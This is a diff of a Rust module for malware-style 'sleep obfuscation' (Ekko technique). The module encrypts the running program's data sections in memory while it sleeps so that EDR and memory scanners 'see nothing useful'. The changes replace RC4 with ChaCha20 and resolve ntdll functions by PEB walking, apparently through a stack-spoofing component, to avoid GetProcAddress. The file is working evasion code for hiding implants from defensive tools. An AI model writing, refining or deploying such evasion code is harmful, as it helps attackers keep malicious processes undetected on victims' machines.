@@ -2,33 +2,27 @@
 #![allow(non_camel_case_types)]
 #![allow(dead_code)]
 
-//! # Sleep Obfuscation (Timer-Queue Evasion / Ekko)
+//! # Sleep Obfuscation (Timer-Queue Evasion / Ekko) - Enhanced
 //!
-//! Encrypts the entire image in RAM when sleeping.
+//! Encrypts data sections in RAM when sleeping.
 //! Memory scanners see only encrypted garbage.
 //!
 //! ## Flow
-//! 1. `NtProtectVirtualMemory` - Change RX → RW
-//! 2. `SystemFunction032` - RC4 encrypt image
-//! 3. `NtWaitForSingleObject` - Sleep (encrypted state)
-//! 4. `SystemFunction032` - RC4 decrypt image
-//! 5. `NtProtectVirtualMemory` - Change RW → RX
+//! 1. Find .data/.rdata section boundaries from PE headers
+//! 2. `NtProtectVirtualMemory` - Change R → RW
+//! 3. ChaCha20 stream cipher - Encrypt data in-place
+//! 4. `NtWaitForSingleObject` - Sleep (data is encrypted)
+//! 5. ChaCha20 - Decrypt data
+//! 6. `NtProtectVirtualMemory` - Restore protection
 
 use std::ffi::c_void;
 use std::ptr;
 use std::mem;
-use log::{info, debug, error};
+use log::{info, debug, error, warn};
+use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+use rand::RngCore;
 
-// ============================================================================
-// USTRING for SystemFunction032
-// ============================================================================
-
-#[repr(C)]
-pub struct USTRING {
-    pub length: u32,
-    pub maximum_length: u32,
-    pub buffer: *mut c_void,
-}
+use crate::stealth::windows::stack_spoof;
 
 // ============================================================================
 // API TYPES
@@ -37,7 +31,6 @@ pub struct USTRING {
 type FnNtProtectVirtualMemory = unsafe extern "system" fn(
     process: isize, base: *mut *mut c_void, size: *mut usize, new: u32, old: *mut u32
 ) -> i32;
-type FnSystemFunction032 = unsafe extern "system" fn(data: *mut USTRING, key: *mut USTRING) -> i32;
 type FnNtWaitForSingleObject = unsafe extern "system" fn(handle: *mut c_void, alertable: i32, timeout: *mut i64) -> i32;
 type FnNtCreateEvent = unsafe extern "system" fn(
     handle: *mut *mut c_void, access: u32, attr: *const c_void, event_type: i32, initial: i32
@@ -45,106 +38,163 @@ type FnNtCreateEvent = unsafe extern "system" fn(
 type FnNtClose = unsafe extern "system" fn(handle: *mut c_void) -> i32;
 
 const PAGE_READWRITE: u32 = 0x04;
-const PAGE_EXECUTE_READ: u32 = 0x20;
+const PAGE_READONLY: u32 = 0x02;
 const EVENT_ALL_ACCESS: u32 = 0x1F0003;
 
 // ============================================================================
-// GET CURRENT MODULE IMAGE BASE AND SIZE
+// PE SECTION PARSING
 // ============================================================================
 
-/// Get the current executable's image base and size from PEB
-unsafe fn get_current_image_info() -> Option<(*mut c_void, usize)> {
-    #[cfg(target_arch = "x86_64")]
-    {
-        // PEB is at gs:[0x60]
-        let peb: *const u8;
-        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
+#[repr(C)]
+struct ImageSectionHeader {
+    name: [u8; 8],
+    virtual_size: u32,
+    virtual_address: u32,
+    size_of_raw_data: u32,
+    pointer_to_raw_data: u32,
+    pointer_to_relocations: u32,
+    pointer_to_linenumbers: u32,
+    number_of_relocations: u16,
+    number_of_linenumbers: u16,
+    characteristics: u32,
+}
+
+/// Get list of encryptable sections (.data, .rdata only - NOT .text!)
+unsafe fn get_encryptable_sections() -> Vec<(*mut u8, usize, u32)> {
+    let mut sections = Vec::new();
+    
+    // Get image base from PEB
+    let peb: *const u8;
+    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
+    let image_base = *(peb.add(0x10) as *const *mut u8);
+    
+    // Parse PE headers
+    let dos = image_base;
+    if *(dos as *const u16) != 0x5A4D { return sections; }
+    
+    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
+    let nt = dos.add(e_lfanew as usize);
+    
+    // FileHeader.NumberOfSections at NT+6
+    let num_sections = *((nt as usize + 6) as *const u16) as usize;
+    // FileHeader.SizeOfOptionalHeader at NT+20
+    let opt_header_size = *((nt as usize + 20) as *const u16) as usize;
+    
+    // Section headers start after optional header
+    // NT sig (4) + FileHeader (20) + OptionalHeader (variable)
+    let sections_start = nt.add(4 + 20 + opt_header_size) as *const ImageSectionHeader;
+    
+    for i in 0..num_sections {
+        let section = &*sections_start.add(i);
+        let name = std::str::from_utf8(&section.name).unwrap_or("");
         
-        // ImageBaseAddress is at PEB + 0x10
-        let image_base = *(peb.add(0x10) as *const *mut c_void);
+        // Only encrypt DATA sections, NEVER code sections!
+        // .data = global variables
+        // .rdata = read-only data (strings, vtables, etc.)
+        // .bss = uninitialized data
+        // DO NOT encrypt .text, .code, or any executable section
+        let is_data_section = name.starts_with(".data") 
+            || name.starts_with(".rdata")
+            || name.starts_with(".bss");
         
-        // Parse PE header to get SizeOfImage
-        let dos_header = image_base as *const u8;
-        let e_lfanew = *((dos_header as usize + 0x3C) as *const i32);
-        let nt_headers = (dos_header as usize + e_lfanew as usize) as *const u8;
+        // Skip executable sections (characteristic 0x20000000 = IMAGE_SCN_MEM_EXECUTE)
+        let is_executable = (section.characteristics & 0x20000000) != 0;
         
-        // SizeOfImage is at OptionalHeader + 0x38 (offset 0x50 from NT headers)
-        let size_of_image = *((nt_headers as usize + 0x50) as *const u32) as usize;
-        
-        Some((image_base, size_of_image))
+        if is_data_section && !is_executable && section.virtual_size > 0 {
+            let addr = image_base.add(section.virtual_address as usize);
+            let size = section.virtual_size as usize;
+            let old_protect = if name.starts_with(".rdata") { PAGE_READONLY } else { PAGE_READWRITE };
+            
+            debug!("[Ekko] Encryptable section: {} @ {:p}, size: 0x{:X}", 
+                   name.trim_end_matches('\0'), addr, size);
+            sections.push((addr, size, old_protect));
+        }
     }
     
-    #[cfg(not(target_arch = "x86_64"))]
-    {
-        None
-    }
+    sections
 }
 
 // ============================================================================
-// SLEEP OBFUSCATION (EKKO TECHNIQUE)
+// CHACHA20 IN-PLACE ENCRYPTION
 // ============================================================================
 
-/// Obfuscated sleep - encrypts ACTUAL executable memory while sleeping
-pub unsafe fn obfuscated_sleep(duration_ms: u32) -> Result<(), String> {
-    info!("[Ekko] Starting obfuscated sleep: {}ms", duration_ms);
-
-    // 1. Resolve APIs via GetProcAddress
-    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
-    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
+/// Encrypt/decrypt memory in-place using ChaCha20
+fn chacha20_crypt(data: *mut u8, len: usize, key: &[u8; 32], nonce: &[u8; 12]) {
+    let mut cipher = ChaCha20::new(key.into(), nonce.into());
     
-    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
-    let advapi32 = GetModuleHandleA(b"advapi32.dll\0".as_ptr());
+    const CHUNK_SIZE: usize = 4096;
+    let mut offset = 0;
     
-    if ntdll == 0 || advapi32 == 0 {
-        return Err("[Ekko] Failed to get module handles".into());
+    while offset < len {
+        let remaining = len - offset;
+        let chunk_len = remaining.min(CHUNK_SIZE);
+        
+        let chunk = unsafe { 
+            std::slice::from_raw_parts_mut(data.add(offset), chunk_len) 
+        };
+        cipher.apply_keystream(chunk);
+        offset += chunk_len;
     }
+}
+
+/// Generate cryptographically secure key and nonce
+fn generate_key_nonce() -> ([u8; 32], [u8; 12]) {
+    let mut key = [0u8; 32];
+    let mut nonce = [0u8; 12];
+    
+    // Use rand crate's cryptographically secure RNG
+    let mut rng = rand::thread_rng();
+    rng.fill_bytes(&mut key);
+    rng.fill_bytes(&mut nonce);
+    
+    (key, nonce)
+}
+
+// ============================================================================
+// SLEEP OBFUSCATION (ENHANCED EKKO - DATA SECTIONS ONLY)
+// ============================================================================
+
+/// Obfuscated sleep - encrypts DATA SECTIONS while sleeping
+/// 
+/// IMPORTANT: This encrypts .data/.rdata only, NOT the running code.
+/// Encrypting .text would crash since the encryption function would encrypt itself.
+pub unsafe fn obfuscated_sleep(duration_ms: u32) -> Result<(), String> {
+    info!("[Ekko] Starting enhanced obfuscated sleep: {}ms", duration_ms);
+
+    // 1. Resolve APIs via PEB walking (avoid GetProcAddress)
+    let ntdll = stack_spoof::get_ntdll_base()
+        .ok_or("[Ekko] Failed to get ntdll base")?;
 
     let fn_protect: FnNtProtectVirtualMemory = mem::transmute(
-        GetProcAddress(ntdll, b"NtProtectVirtualMemory\0".as_ptr())
+        stack_spoof::get_export_address(ntdll, b"NtProtectVirtualMemory\0")
+            .ok_or("[Ekko] Failed to resolve NtProtectVirtualMemory")?
     );
     let fn_wait: FnNtWaitForSingleObject = mem::transmute(
-        GetProcAddress(ntdll, b"NtWaitForSingleObject\0".as_ptr())
+        stack_spoof::get_export_address(ntdll, b"NtWaitForSingleObject\0")
+            .ok_or("[Ekko] Failed to resolve NtWaitForSingleObject")?
     );
     let fn_create_event: FnNtCreateEvent = mem::transmute(
-        GetProcAddress(ntdll, b"NtCreateEvent\0".as_ptr())
+        stack_spoof::get_export_address(ntdll, b"NtCreateEvent\0")
+            .ok_or("[Ekko] Failed to resolve NtCreateEvent")?
     );
     let fn_close: FnNtClose = mem::transmute(
-        GetProcAddress(ntdll, b"NtClose\0".as_ptr())
-    );
-    let fn_rc4: FnSystemFunction032 = mem::transmute(
-        GetProcAddress(advapi32, b"SystemFunction032\0".as_ptr())
+        stack_spoof::get_export_address(ntdll, b"NtClose\0")
+            .ok_or("[Ekko] Failed to resolve NtClose")?
     );
 
-    // 2. Get ACTUAL current executable image base and size
-    let (image_base, image_size) = get_current_image_info()
-        .ok_or("[Ekko] Failed to get image info")?;
-    
-    info!("[Ekko] Image base: {:p}, size: 0x{:X}", image_base, image_size);
-
-    let mut base = image_base;
-    let mut size = image_size;
-
-    // 3. Generate random RC4 key
-    let seed = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_nanos() as u64;
-    let mut key: [u8; 16] = [0; 16];
-    for i in 0..16 {
-        key[i] = ((seed.wrapping_mul((i as u64).wrapping_add(1))) >> ((i * 4) % 64)) as u8;
+    // 2. Get encryptable sections (.data, .rdata - NOT .text!)
+    let sections = get_encryptable_sections();
+    if sections.is_empty() {
+        warn!("[Ekko] No encryptable sections found, using simple sleep");
+        std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
+        return Ok(());
     }
+    
+    info!("[Ekko] Found {} encryptable data sections", sections.len());
 
-    let mut key_ustr = USTRING {
-        length: 16,
-        maximum_length: 16,
-        buffer: key.as_mut_ptr() as *mut c_void,
-    };
-
-    let mut data_ustr = USTRING {
-        length: size as u32,
-        maximum_length: size as u32,
-        buffer: base,
-    };
+    // 3. Generate cryptographically secure key and nonce
+    let (key, nonce) = generate_key_nonce();
+    debug!("[Ekko] ChaCha20 key generated (cryptographically secure)");
 
     // 4. Create event for timeout  
     let mut h_event: *mut c_void = ptr::null_mut();
@@ -153,50 +203,56 @@ pub unsafe fn obfuscated_sleep(duration_ms: u32) -> Result<(), String> {
         return Err(format!("[Ekko] NtCreateEvent failed: 0x{:X}", status));
     }
 
-    // 5. Change protection: RX → RW (so we can encrypt)
-    let mut old_protect: u32 = 0;
-    let status = fn_protect(-1, &mut base, &mut size, PAGE_READWRITE, &mut old_protect);
-    if status != 0 {
-        fn_close(h_event);
-        return Err(format!("[Ekko] NtProtect(RW) failed: 0x{:X}", status));
+    // 5. Change protection and encrypt each data section
+    let mut section_info: Vec<(*mut u8, usize, u32)> = Vec::new();
+    
+    for (addr, size, original_protect) in &sections {
+        let mut base = *addr as *mut c_void;
+        let mut region_size = *size;
+        let mut old_protect: u32 = 0;
+        
+        // Change to RW so we can encrypt
+        let status = fn_protect(-1, &mut base, &mut region_size, PAGE_READWRITE, &mut old_protect);
+        if status != 0 {
+            error!("[Ekko] NtProtect failed for {:p}: 0x{:X}", addr, status);
+            continue;
+        }
+        
+        // Encrypt this section
+        chacha20_crypt(*addr, *size, &key, &nonce);
+        section_info.push((*addr, *size, old_protect));
     }
-    debug!("[Ekko] Protection changed: 0x{:X} → RW", old_protect);
+    
+    info!("[Ekko] {} data sections ENCRYPTED", section_info.len());
 
-    // 6. Encrypt entire image with RC4 (SystemFunction032)
-    let status = fn_rc4(&mut data_ustr, &mut key_ustr);
-    if status != 0 {
-        // Restore protection before returning error
-        fn_protect(-1, &mut base, &mut size, old_protect, &mut old_protect);
-        fn_close(h_event);
-        return Err(format!("[Ekko] RC4 encrypt failed: 0x{:X}", status));
-    }
-    info!("[Ekko] Image ENCRYPTED in RAM");
-
-    // 7. Sleep (memory is encrypted garbage - EDR sees nothing!)
+    // 6. Sleep (data is encrypted garbage - EDR sees nothing useful!)
     let mut timeout = -((duration_ms as i64) * 10000); // 100ns units, negative = relative
     fn_wait(h_event, 0, &mut timeout);
 
-    // 8. Decrypt with RC4 (symmetric - same operation decrypts)
-    data_ustr.buffer = image_base;
-    let status = fn_rc4(&mut data_ustr, &mut key_ustr);
-    if status != 0 {
-        error!("[Ekko] RC4 decrypt failed: 0x{:X} - CRITICAL!", status);
-        // Can't recover from this - process will crash
+    // 7. Decrypt and restore each section
+    for (addr, size, old_protect) in &section_info {
+        // Decrypt
+        chacha20_crypt(*addr, *size, &key, &nonce);
+        
+        // Restore original protection
+        let mut base = *addr as *mut c_void;
+        let mut region_size = *size;
+        let mut temp: u32 = 0;
+        let _ = fn_protect(-1, &mut base, &mut region_size, *old_protect, &mut temp);
     }
-    debug!("[Ekko] Image DECRYPTED");
+    
+    debug!("[Ekko] Data sections DECRYPTED and restored");
 
-    // 9. Restore original protection (RW → RX)
-    base = image_base;
-    size = image_size;
-    let status = fn_protect(-1, &mut base, &mut size, old_protect, &mut old_protect);
-    if status != 0 {
-        error!("[Ekko] NtProtect restore failed: 0x{:X}", status);
-    }
-    debug!("[Ekko] Protection restored");
-
-    // 10. Cleanup
+    // 8. Cleanup
     fn_close(h_event);
 
-    info!("[Ekko] Obfuscated sleep COMPLETE");
+    info!("[Ekko] Enhanced obfuscated sleep COMPLETE");
     Ok(())
 }
+
+/// Quick encrypted sleep (simplified API)
+pub unsafe fn sleep_encrypted(seconds: u32) -> Result<(), String> {
+    obfuscated_sleep(seconds * 1000)
+}
+
+
